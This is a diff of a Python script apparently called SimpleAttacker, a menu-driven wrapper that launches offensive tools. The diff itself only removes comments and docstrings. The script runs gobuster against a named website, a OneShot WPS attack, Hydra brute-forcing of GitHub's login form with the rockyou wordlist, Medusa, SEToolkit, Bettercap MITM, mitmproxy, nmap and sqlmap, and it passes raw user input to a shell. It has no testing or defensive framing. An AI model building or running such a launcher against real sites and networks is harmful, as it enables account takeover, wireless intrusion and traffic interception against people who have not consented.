@@ -28,7 +28,7 @@ class SimpleAttacker:
             f.write(f"Command: {cmd}\n")
             f.write("="*60 + "\n")
             
-            # Run with live output
+            
             process = subprocess.Popen(
                 cmd,
                 shell=True,
@@ -38,7 +38,7 @@ class SimpleAttacker:
                 bufsize=1
             )
             
-            # Show output line by line
+            
             while True:
                 line = process.stdout.readline()
                 if not line and process.poll() is not None:
@@ -52,7 +52,7 @@ class SimpleAttacker:
             print("\n" + "-" * 60)
             print(f"✅ Done! Output saved to: {output_file}")
     
-    # ==== YOUR EXACT COMMANDS ====
+    
     
     def run_gobuster(self):
         """YOUR COMMAND: sudo gobuster dir -u https://pihatch.com -w (directory) --exclude-length 18979"""
@@ -63,12 +63,12 @@ class SimpleAttacker:
         if not wordlist:
             wordlist = "/usr/share/wordlists/dirb/common.txt"
         
-        # YOUR EXACT COMMAND
+        
         cmd = f"sudo gobuster dir -u {url} -w {wordlist} --exclude-length 18979"
         self.run_command_live(cmd, "gobuster")
     
     def run_dirb(self):
-        """YOUR COMMAND: dirb (link) (suggested word list)"""
+        
         print("\n📁 DIRB DIRECTORY SCAN")
         url = input("Target URL (http://example.com): ").strip()
         wordlist = input("Wordlist [/usr/share/wordlists/dirb/common.txt]: ").strip()
@@ -76,15 +76,16 @@ class SimpleAttacker:
         if not wordlist:
             wordlist = "/usr/share/wordlists/dirb/common.txt"
         
-        # YOUR EXACT COMMAND
+        
+      
         cmd = f"dirb {url} {wordlist}"
         self.run_command_live(cmd, "dirb")
     
     def run_oneshot(self):
-        """YOUR COMMAND: sudo python3 (oneshot directory)/oneshot.py -i wlan0 -K"""
+       
         print("\n🔓 ONESHOT WPS ATTACK")
         
-        # Find oneshot
+        
         oneshot_path = None
         for path in ["OneShot/oneshot.py", "./oneshot.py", "oneshot.py"]:
             if Path(path).exists():
@@ -98,12 +99,12 @@ class SimpleAttacker:
         
         interface = input("Wireless interface (wlan0): ").strip() or "wlan0"
         
-        # YOUR EXACT COMMAND
+        
         cmd = f"sudo python3 {oneshot_path} -i {interface} -K"
         self.run_command_live(cmd, "oneshot")
     
     def run_hydra(self):
-        """YOUR COMMAND: sudo hydra -t 4 -V -f -l () -P (dir) github.com http-post-form "/login:Username or email address=^USER^&Password=^PASS^&Login=Sign in:F=Incorrect username or password." """
+        
         print("\n🔐 HYDRA LOGIN ATTACK")
         
         target = input("Target (github.com): ").strip() or "github.com"
@@ -113,39 +114,39 @@ class SimpleAttacker:
         if not password_file:
             password_file = "/usr/share/wordlists/rockyou.txt"
         
-        # YOUR EXACT COMMAND
+        
         cmd = f'sudo hydra -t 4 -V -f -l {username} -P {password_file} {target} http-post-form "/login:Username or email address=^USER^&Password=^PASS^&Login=Sign in:F=Incorrect username or password."'
         self.run_command_live(cmd, "hydra")
     
     def run_medusa(self):
-        """SIMPLE Medusa command"""
+        
         print("\n⚡ MEDUSA ATTACK")
         
         target = input("Target IP/URL: ").strip()
         username = input("Username (admin): ").strip() or "admin"
         password_file = input("Password file: ").strip() or "/usr/share/wordlists/rockyou.txt"
         
-        # Simple Medusa command
+        
         cmd = f"medusa -h {target} -u {username} -P {password_file} -M http"
         self.run_command_live(cmd, "medusa")
     
     def run_setoolkit(self):
-        """SIMPLE Setoolkit launch"""
+        
         print("\n🎭 SETOOLKIT SOCIAL ENGINEERING")
         print("Launching SEToolkit in new terminal...")
         
-        # Simple setoolkit command
+        
         cmd = "setoolkit"
         self.run_command_live(cmd, "setoolkit")
     
     def run_bettercap(self):
-        """SIMPLE Bettercap MITM"""
+        
         print("\n👂 BETTERCAP MITM ATTACK")
         
         interface = input("Network interface (eth0): ").strip() or "eth0"
         target = input("Target IP/Range (192.168.1.0/24): ").strip() or "192.168.1.0/24"
         
-        # Simple Bettercap command
+        
         cmd = f"sudo bettercap -iface {interface}"
         print(f"\n🚀 Manually run in Bettercap:")
         print(f"  net.probe on")
@@ -163,7 +164,7 @@ class SimpleAttacker:
         print("\n🌐 MITMPROXY INTERCEPTION")
         port = input("Port (8080): ").strip() or "8080"
         
-        # Simple mitmproxy command
+        
         cmd = f"mitmproxy -p {port}"
         self.run_command_live(cmd, "mitmproxy")
     
@@ -172,12 +173,12 @@ class SimpleAttacker:
         print("\n🔍 NMAP SCAN")
         target = input("Target (192.168.1.1): ").strip() or "192.168.1.1"
         
-        # Simple Nmap command
+        
         cmd = f"nmap -sV -sC {target}"
         self.run_command_live(cmd, "nmap")
     
     def run_sqlmap(self):
-        """SIMPLE SQLMap test"""
+        
         print("\n💉 SQLMAP INJECTION TEST")
         url = input("Target URL with parameter (http://test.com/page?id=1): ").strip()
         
@@ -185,12 +186,12 @@ class SimpleAttacker:
             print("❌ No URL provided!")
             return
         
-        # Simple SQLMap command
+        
         cmd = f"sqlmap -u '{url}' --batch"
         self.run_command_live(cmd, "sqlmap")
     
     def run_quick_scan(self):
-        """Quick all-in-one scan"""
+       
         print("\n⚡ QUICK ALL-IN-ONE SCAN")
         target = input("Target (URL or IP): ").strip()
         
@@ -218,7 +219,7 @@ class SimpleAttacker:
         print(f"\n✅ Quick scan complete! Check {self.results_dir}")
     
     def main_menu(self):
-        """Simple main menu"""
+        
         while True:
             self.print_header()
             
